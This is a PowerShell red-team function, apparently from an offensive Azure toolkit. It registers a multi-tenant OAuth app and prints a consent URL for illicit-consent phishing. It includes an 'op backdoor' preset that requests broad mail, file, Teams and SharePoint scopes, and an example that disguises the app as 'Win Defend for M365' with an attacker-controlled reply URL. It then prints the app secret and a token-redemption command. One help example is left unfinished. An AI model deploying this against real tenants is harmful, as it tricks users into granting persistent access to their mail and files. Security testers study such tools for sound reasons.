function Inject-OAuthApp{


<#
    .SYNOPSIS
        This is a CLI tool for automating the deployment of an app registration to a Microsoft Azure tenant. In the event that the Azure portal is locked down this may provide an additional mechanism for app deployment, provided that user's are allowed to register apps in the tenant.
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
       This is a CLI tool for automating the deployment of an app registration to a Microsoft Azure tenant. In the event that the Azure portal is locked down this may provide an additional mechanism for app deployment, provided that user's are allowed to register apps in the tenant.        
    
    .PARAMETER AppName
        
        The display name of the App Registration. This is what will be displayed on the consent page.
    
    
    .PARAMETER ReplyUrl
        
        The reply URL to redirect a user to after app consent. This is where you will want to capture the OAuth code and complete the flow to obtain an access token and refresh token.
    
    .PARAMETER Scope
        
        Delegated Microsoft Graph permissions to scope to the app. Example: Mail.Read, User.ReadBasic.All, etc. Scope items need to be comma separated with each item in double quotes like this (-scope "Mail.Read","openid","email","profile","offline_access")
    

    .EXAMPLE
        
        C:\PS> Invoke-InjectOAuthApp -AppName "Win Defend for M365" -Secret "HackThePlanet1337!" -ReplyUrl "https://windefend.azurewebsites.net" -scope "openid","Mail.Read","email","profile","offline_access"
        Description
        -----------
        This command will inject an app registration with the display name of "Win Defend for M365" with a scope of openid, Mail.Read, email, profile, and offline_access
    
    .EXAMPLE
        
        C:\PS> Invoke-
        Description
        -----------
        This command uses 
#>
  Param(


    [Parameter(Position = 0, Mandatory = $True)]
    [string]
    $AppName = "",

    [Parameter(Position = 1, Mandatory = $True)]
    [string]
    $ReplyUrl = "",

    [Parameter(Position = 2, Mandatory = $True)]
    [string[]]
    $Scope
  )
# Login
Write-Host -ForegroundColor yellow "[*] First you need to login as the user you want to deploy the app as."
az login --use-device-code --allow-no-subscriptions

# Get Microsoft Graph Object ID
Write-Host -ForegroundColor yellow "[*] Getting Microsoft Graph Object ID"
$graphId = az ad sp list --query "[?appDisplayName=='Microsoft Graph'].appId | [0]" --all
Write-Output "Graph ID: $graphId"

# Get Object IDs of individual permissions
Write-Host -ForegroundColor yellow "[*] Now getting object IDs for scope objects:"
if ($Scope -like "op backdoor")
{
    $Scope = "openid","profile","offline_access","email","User.Read","User.ReadBasic.All","Mail.Read","Mail.Send","Mail.Read.Shared","Mail.Send.Shared","Files.ReadWrite.All","EWS.AccessAsUser.All","ChatMessage.Read","ChatMessage.Send","Chat.ReadWrite","Chat.Create","ChannelMessage.Edit","ChannelMessage.Send","Channel.ReadBasic.All","Presence.Read.All","Team.ReadBasic.All","Team.Create","Sites.Manage.All","Sites.Read.All","Sites.ReadWrite.All","Policy.Read.ConditionalAccess"
    Write-Host -ForegroundColor yellow "[*] One overpowered (OP) backdoor is coming right up! Here is the scope:"
}
$scopeurl = ""
$accesslist = ""
$scopeIds = @{}
$joinedScope = $Scope -join " "
$joinedScope

# Loop through each item in $Scope
foreach ($item in $Scope){
    $variableName = $item -replace "[\W\d]", ""  # Remove non-alphanumeric characters and digits
    $variableName = $variableName + "Scope"
    
    $scopeId = az ad sp show --id $graphId --query "oauth2PermissionScopes[?value=='$item'].id | [0]"
    if (!$scopeId){Write-host -foregroundcolor red "[**] Couldn't find scope option $item"}
    else{
    Write-Host ($item + " : " + $scopeId)
    $scopeurl += "$item%20"
    $accesslist += '{"id": ' + $scopeId + ',"type": "Scope"},'
    
    # Store the scope ID in the hashtable
    $scopeIds[$variableName] = $scopeId
    }
}


Write-Host -ForegroundColor yellow "[*] Finished collecting object IDs of permissions."
# Create a resources variable
$permissions = $accesslist.Trim(",")

$resources = @"
[{ "resourceAppId": $graphId, "resourceAccess": [$permissions]}]
"@ | ConvertTo-Json


# Create the app in the tenant
Write-host -ForegroundColor yellow "[*] Now deploying the app registration with display name $AppName to the tenant."

    $app = az ad app create --display-name $AppName --key-type "Password" --web-redirect-uris $ReplyUrl --required-resource-accesses $resources --sign-in-audience "AzureADMultipleOrgs" | ConvertFrom-Json   
if ($app -match "ERROR"){
    Write-host -ForegroundColor red "[*] An error occurred during deployment."
    break
}
$Secret = az ad app credential reset --id $app.id --only-show-errors | ConvertFrom-Json
if ($Secret -match "ERROR"){
    Write-host -ForegroundColor red "[*] An error occurred the creation of the app secret."
    break
}
# Generate the Consent URL
Write-host -ForegroundColor yellow "[*] If everything worked successfully this is the consent URL you can use to grant consent to the app:"
$consentURL = "https://login.microsoftonline.com/organizations/oauth2/v2.0/authorize?client_id=" + $app.AppId + "&response_type=code&redirect_uri=
" + [System.Web.HttpUtility]::UrlEncode($ReplyUrl) + "&response_mode=query&scope=" + $scopeurl.Trim("%20") + "&state=1234"
Write-Host "--------------------------------------------------------"
Write-Host -ForegroundColor green $consentURL
Write-Host "--------------------------------------------------------"
Write-Host ("Application ID: " + $app.AppId)
Write-Host ("Object ID: " + $app.Id)
Write-Host ("Secret: " + $Secret.Password)
Write-Host "--------------------------------------------------------"
Write-Host "After you obtain an OAuth Code from the redirect URI server you can use this command to complete the flow:"
Write-Host "--------------------------------------------------------"
$scopeclean = ('"' + $scopeurl.replace('%20', ' ').Trim(" ") + '"')
Write-Host -ForegroundColor Cyan ('Get-AzureAccessToken -ClientId "' + $app.AppId + '" -ClientSecret "' + $Secret.Password + '" -RedirectUri "' + $ReplyURL + '" -scope ' + $scopeclean + " -AuthCode <insert your OAuth Code here>")
}
